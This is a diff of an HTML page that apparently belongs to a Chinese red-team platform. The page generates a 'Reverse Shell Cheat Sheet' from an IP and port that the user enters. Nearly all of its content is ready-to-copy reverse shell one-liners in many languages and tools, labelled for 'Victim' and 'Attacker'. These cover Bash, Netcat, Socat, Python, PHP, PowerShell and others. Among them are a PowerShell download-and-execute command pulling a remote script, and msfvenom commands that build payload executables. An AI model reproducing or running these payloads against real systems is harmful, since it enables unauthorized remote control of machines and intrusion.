@@ -1,95 +1,54 @@
 
 <!DOCTYPE html>
-<html>
-    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>Reverse Shell Cheat Sheet</title>
-    <link rel="shortcut icon" href="https://www.lintstar.top/plogo/favicon-32x32.png">
-    <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css">  
-	<script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"></script>
-    <script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
-    <script src="https://cdn.staticfile.org/vue/2.2.2/vue.min.js"></script>
-<script>
-function disableScrolling(){
-    var x=window.scrollX;
-    var y=window.scrollY;
-    window.onscroll=function(){window.scrollTo(x, y);};
-}
-
-function enableScrolling(){
-    window.onscroll=function(){};
-}
-
-function copy(item_id) {
-  disableScrolling();
-  var copyText = document.getElementById(item_id).textContent;
-  const textArea = document.getElementById('txt');
-  textArea.textContent = copyText;
-  textArea.select();
-  document.execCommand("copy");  
-  enableScrolling();
-  return false;
-}
-</script>	
-<style type="text/css">
-button{
-	
-	padding:0 5px;
-	margin:0;
-}
-textarea {
-  position: fixed;
-  left: -100%;
-}
-pre{
-	font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;
-	font-size:15px;
-	background-color: #f6f8fa;
-	overflow: auto;
-    border: 1px solid #898989;
-    padding: 13px;
-}
-.main{
-	max-width:800px; 
-	margin:auto;
-	background-color: #fff;
-	padding:28px;
-	border: 1px solid #898989;
-}
-input[type=text]{
-	border: 1px solid #898989;	
-	font-size:22px;
-width:200px;
-}
-</style>
+<html lang="zh">
+ <head> 
+  <meta charset="utf-8" /> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /> 
+  <title>反弹 Shell 命令生成</title> 
+  <link rel="icon" href="/static/favicon.ico" type="image/ico" /> 
+  <meta name="keywords" content="凌星阁,红队作战平台" /> 
+  <meta name="author" content="Lintstar" />
+    <link rel="stylesheet" href="static/css/bootstrap.min.css">  
+    <link href="static/css/materialdesignicons.min.css" rel="stylesheet" /> 
+    <link href="static/css/style.min.css" rel="stylesheet" /> 
+    <script src="static/js/jquery.min.js"></script>
+    <script src="static/js/bootstrap.min.js"></script>
+    <script src="static/js/vue.min.js"></script>
 </head>
 <body>
-<div id="app">
-    <div class="container">
-        <div class="row" >
-            <h1 style="text-align: center;">反弹Shell</h1>
-            <hr>
-            <div class="panel panel-default">
-                <div class="panel-heading">
-                    <h3 class="panel-title">
-                        VPS
-                    </h3>
-                </div>
-                <div class="panel-body">
-                    <h5>IP:</h5><input  class="form-control" type="text" value="" name="ip"  v-model="ip_address" placeholder="请输入IP">
+<div class="container-fluid p-t-15">
+    <div id="app">
+        <div class="row">
+
+            <div class="col-md-12 col-lg-12">
+                <div class="card"> 
+                    <div class="card-header bg-danger">
+                        <h1 style="text-align: center;">Reverse Shell Cheat Sheet</h1>
+                    </div> 
                     <hr>
-                    <h5>Port:</h5><input  class="form-control" type="text" value="" name="port" v-model="ip_port" placeholder="请输入端口"> 
+                    <div class="card">
+                        <div class="callout callout-danger">
+                         Tips:  
+                        <code> 在下方输入VPS的IP地址和端口 即可实时生成不同类型的命令</code>
+                        </div> 
+                        <div class="card-body">
+                            <h5>IP:</h5><input  class="form-control" type="text" value="" name="ip"  v-model="ip_address" placeholder="请输入IP">
+                            <hr>
+                            <h5>Port:</h5><input  class="form-control" type="text" value="" name="port" v-model="ip_port" placeholder="请输入端口"> 
+                        </div>
+                    </div>
                 </div>
             </div>
             <hr> 
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-primary">
+                    <div class="card-header bg-primary">
+                        <h3>
                             Bash TCP
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                         <h5>Victim:</h5>
                         <pre>bash -i &gt;&amp; /dev/tcp/{{ ip_address }}/{{ip_port}} 0&gt;&amp;1</pre>
                         <pre>/bin/bash -i &gt; /dev/tcp/{{ ip_address }}/{{ip_port}} 0&lt;&amp; 2&gt;&amp;1</pre>
@@ -100,14 +59,14 @@ width:200px;
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-info">
+                    <div class="card-header bg-info">
+                        <h3>
                             Bash UDP
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                         <h5>Victim:</h5>
                         <pre>sh -i >& /dev/udp/{{ ip_address }}/{{ip_port}} 0>&1</pre>
                         <hr>
@@ -117,14 +76,14 @@ width:200px;
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-pink">
+                    <div class="card-header bg-pink">
+                        <h3>
                             Netcat
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                         <pre>nc -e /bin/sh {{ ip_address }} {{ip_port}}</pre>
                         <pre>nc -e /bin/bash {{ ip_address }} {{ip_port}}</pre>
                         <pre>nc -c bash {{ ip_address }} {{ip_port}}</pre>
@@ -137,14 +96,14 @@ width:200px;
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-yellow">
+                    <div class="card-header bg-yellow">
+                        <h3>
                             Ncat
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                         <pre>ncat {{ ip_address }} {{ip_port}} -e /bin/bash</pre>
                         <pre>ncat --udp {{ ip_address }} {{ip_port}} -e /bin/bash</pre>
                     </div>
@@ -152,14 +111,14 @@ width:200px;
             </div>
 
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-danger">
+                    <div class="card-header bg-danger">
+                        <h3>
                             Telnet
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                         <pre>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet {{ ip_address }} {{ip_port}} 0/tmp/p 2&gt;&amp;1</pre>
                         <pre>telnet {{ ip_address }} {{ip_port}} | /bin/bash | telnet {{ ip_address }} 100000000</pre>
                         <pre>rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet {{ ip_address }} {{ip_port}} &gt; f</pre>
@@ -168,14 +127,14 @@ width:200px;
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-success">
+                    <div class="card-header bg-success">
+                        <h3>
                             Socat
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                         <h5>Victim:</h5>
                         <pre>/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{ ip_address }}:{{ip_port}}</pre>
                         <pre>socat tcp-connect:{{ ip_address }}:{{ip_port}} exec:"bash -li",pty,stderr,setsid,sigint,sane</pre>
@@ -189,14 +148,14 @@ width:200px;
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-purple">
+                    <div class="card-header bg-purple">
+                        <h3>
                             Perl
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                         <h5>Victim:</h5>
                         <pre>perl -e &#x27;use Socket;$i=&quot;{{ ip_address }}&quot;;$p={{ip_port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#x27;</pre>
                         <pre>perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;{{ ip_address }}:{{ip_port}}&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</pre>
@@ -207,14 +166,14 @@ width:200px;
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-pink">
+                    <div class="card-header bg-pink">
+                        <h3>
                             Python
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                         <h5>IPv4:</h5>
                         <pre>python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;{{ ip_address }}&quot;,{{ip_port}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</pre>
                         <pre>export RHOST=&quot;{{ ip_address }}&quot;;export RPORT={{ip_port}};python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</pre>
@@ -229,14 +188,14 @@ width:200px;
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-info">
+                    <div class="card-header bg-info">
+                        <h3>
                             PHP
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                         <pre>php -r &#x27;$sock=fsockopen(&quot;{{ ip_address }}&quot;,{{ip_port}});exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</pre>
                         <pre>php -r &#x27;$s=fsockopen(&quot;{{ ip_address }}&quot;,{{ip_port}});$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);&#x27;</pre>
                         <pre>php -r &#x27;$s=fsockopen(&quot;{{ ip_address }}&quot;,{{ip_port}});shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</pre>
@@ -248,31 +207,29 @@ width:200px;
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
-                            Ruby
+            <div class="col-6">
+                <div class="card border-cyan">
+                    <div class="card-header bg-cyan">
+                        <h3>
+                            Java
                         </h3>
                     </div>
-                    <div class="panel-body">
-                        <pre>ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;{{ ip_address }}&quot;,{{ip_port}}).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</pre>
-                        <pre>ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;{{ ip_address }}&quot;,&quot;{{ip_port}}&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#x27;</pre>
-                        <hr>
-                        <h5>Windows Victim:</h5>
-                        <pre>ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;{{ ip_address }}&quot;,&quot;{{ip_port}}&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#x27;</pre>
+                    <div class="card-body">
+                       <pre>r = Runtime.getRuntime() <br>p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/{{ ip_address }}/{{ip_port}};cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) <br>p.waitFor()</pre>
+                       <pre>String host=&quot;{{ ip_address }}&quot;; <br>int port={{ip_port}}; <br>String cmd=&quot;cmd.exe&quot;; <br>Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
+                       <pre>Thread thread = new Thread(){<br>   public void run(){<br>      // Reverse shell here<br>   }<br>}<br>thread.start();</pre>
                     </div>
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-danger">
+                    <div class="card-header bg-danger">
+                        <h3>
                             OpenSSL
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                         <h5>Attacker:</h5>
                         <pre>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</pre>
                         <pre>openssl s_server -quiet -key key.pem -cert cert.pem -port {{ip_port}}</pre>
@@ -285,68 +242,70 @@ width:200px;
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
-                            AWK
+            <div class="col-6">
+                <div class="card border-success">
+                    <div class="card-header bg-success">
+                        <h3>
+                            Ruby
                         </h3>
                     </div>
-                    <div class="panel-body">
-                       <pre>awk &#x27;BEGIN {s = &quot;/inet/tcp/0/{{ ip_address }}/{{ip_port}}&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#x27; /dev/null</pre>
+                    <div class="card-body">
+                        <pre>ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;{{ ip_address }}&quot;,{{ip_port}}).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</pre>
+                        <pre>ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;{{ ip_address }}&quot;,&quot;{{ip_port}}&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#x27;</pre>
+                        <hr>
+                        <h5>Windows Victim:</h5>
+                        <pre>ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;{{ ip_address }}&quot;,&quot;{{ip_port}}&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#x27;</pre>
                     </div>
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-yellow">
+                    <div class="card-header bg-yellow">
+                        <h3>
                             TCLsh
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                        <pre>echo &#x27;set s [socket {{ ip_address }} {{ip_port}}];while 42 { puts -nonewline $s &quot;shell&gt;&quot;;flush $s;gets $s c;set e &quot;exec $c&quot;;if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;&#x27; | tclsh</pre>
                     </div>
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
-                            Java
+            <div class="col-6">
+                <div class="card border-info">
+                    <div class="card-header bg-info">
+                        <h3>
+                            AWK
                         </h3>
                     </div>
-                    <div class="panel-body">
-                       <pre>r = Runtime.getRuntime() <br>p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/{{ ip_address }}/{{ip_port}};cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) <br>p.waitFor()</pre>
-                       <pre>String host=&quot;{{ ip_address }}&quot;; <br>int port={{ip_port}}; <br>String cmd=&quot;cmd.exe&quot;; <br>Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>
-                       <pre>Thread thread = new Thread(){<br>   public void run(){<br>      // Reverse shell here<br>   }<br>}<br>thread.start();</pre>
+                    <div class="card-body">
+                       <pre>awk &#x27;BEGIN {s = &quot;/inet/tcp/0/{{ ip_address }}/{{ip_port}}&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#x27; /dev/null</pre>
                     </div>
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-pink">
+                    <div class="card-header bg-pink">
+                        <h3>
                             War
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                        <pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST={{ ip_address }} LPORT={{ip_port}} -f war > reverse.war <br>strings reverse.war | grep jsp # in order to get the name of the file</pre>
                     </div>
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-purple">
+                    <div class="card-header bg-purple">
+                        <h3>
                             lua
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                         <h5>Linux Victim:</h5>
                         <pre>lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;{{ ip_address }}&#x27;,&#x27;{{ip_port}}&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</pre>
                         <h5>Windows / Linux Victim:</h5>
@@ -355,14 +314,14 @@ width:200px;
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-primary">
+                    <div class="card-header bg-primary">
+                        <h3>
                             Powershell
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                        <pre>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;{{ ip_address }}&quot;,{{ip_port}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
                        <pre>powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;{{ ip_address }}&#x27;,{{ip_port}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</pre>
                        <pre>powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#x27;)</pre>
@@ -370,14 +329,14 @@ width:200px;
                 </div>
             </div>
 
-            <div class="container">
-                <div class="panel panel-default">
-                    <div class="panel-heading">
-                        <h3 class="panel-title">
+            <div class="col-6">
+                <div class="card border-cyan">
+                    <div class="card-header bg-cyan">
+                        <h3>
                             Meterpreter Shell
                         </h3>
                     </div>
-                    <div class="panel-body">
+                    <div class="card-body">
                        <pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST={{ ip_address }} LPORT={{ip_port}} -f exe &lt; reverse.exe</pre>
                        <pre>msfvenom -p windows/shell_reverse_tcp LHOST={{ ip_address }} LPORT={{ip_port}} -f exe &lt; reverse.exe</pre>
                        <pre>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={{ ip_address }} LPORT={{ip_port}} -f elf &lt;reverse.elf</pre>
